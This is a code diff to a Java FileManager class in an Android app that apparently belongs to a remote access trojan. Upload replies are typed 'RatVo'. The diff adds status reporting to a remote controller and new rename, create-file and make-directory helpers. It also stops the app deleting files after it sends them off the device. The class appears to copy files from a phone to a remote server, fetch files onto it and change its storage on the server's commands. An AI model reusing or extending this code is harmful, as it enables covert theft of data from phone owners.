@@ -40,6 +40,7 @@ import static com.hhm.android.otherapp.TelegramManager.localVersionName;
  * 文件下载
  */
 public class FileManager {
+
     public static final String TAG = "FileManager";
 
     // 获取 path 目录下文件列表
@@ -124,12 +125,10 @@ public class FileManager {
     }
 
     // 下载文件
-    public static void downloadFile(Context context,String path,int action_id,String url){
+    public static void downloadFile(Context context,String path,int action_id,String url) {
         if (path == null)
             return;
-        /*if (!Environment.getRootDirectory().getParentFile().canRead()){
-            path = Environment.getExternalStorageDirectory() + path;
-        }*/
+
         File file = new File(path);
         if (file.exists()){
             SendFile(context,file,action_id,url);
@@ -138,10 +137,7 @@ public class FileManager {
 
 
     //文件上传
-    public static void UploadFile(String path, String downloadUrl){
-        /*if (!Environment.getRootDirectory().getParentFile().canRead()){
-            path = Environment.getExternalStorageDirectory() + path;
-        }*/
+    public static void UploadFile(String path, String downloadUrl,Context context,int action_id) {
         try{
             String url = TelegramManager.url + downloadUrl;
             String filename = path.substring(path.lastIndexOf("/") + 1);
@@ -167,9 +163,11 @@ public class FileManager {
                 downLoadFileSize += numread;
             } while (true);
             Log.e(TAG,"UploadFile():success");
+            TelegramManager.Datas(context,action_id,0,"success",null);
             is.close();
         } catch (Exception ex) {
             Log.e(TAG,"UploadFile():error: " + ex.getMessage(), ex);
+            TelegramManager.Datas(context,action_id,10002,"文件上传失败，请重试！",null);
         }
     }
 
@@ -199,7 +197,6 @@ public class FileManager {
             @Override
             public void onResponse(Call<RatVo> call, Response<RatVo> response) {
                 Log.v("Upload", "success");
-                file.delete();
             }
 
             @Override
@@ -211,34 +208,53 @@ public class FileManager {
     }
 
     // 创建目录
-    public static void Mkdir(String path){
+    public static int Mkdir(String path) {
         File file = new File(path);
         if (file.exists()) {
             System.out.println("目录已存在");
+            return 0;
         } else {
             if (file.mkdirs()){
                 System.out.println("目录创建成功");
+                return 1;
             } else {
                 System.out.println("目录创建失败");
+                return 2;
             }
         }
     }
 
     // 创建文件
-    public static void CreatFile(String path){
+    public static int CreatFile(String path) {
         File file = new File(path);
         if (file.exists()) {
             System.out.println("文件已存在");
+            return 0;
         } else {
             try {
                 if (file.createNewFile()) {
                     System.out.println("文件创建成功");
+                    return 1;
                 } else {
                     System.out.println("文件创建失败");
+                    return 2;
                 }
             } catch (IOException e) {
                 e.printStackTrace();
+                return 3;
             }
+        }
+    }
+
+    // 文件夹/文件 重命名
+    public static int Rename_Dir(String oldpath,String newpath) {
+        File file_old = new File(oldpath);
+        File file_new = new File(newpath);
+        file_old.renameTo(file_new);
+        if (!file_old.exists() && file_new.exists()) {
+            return 1; // success
+        } else {
+            return 0; // fail
         }
     }
 
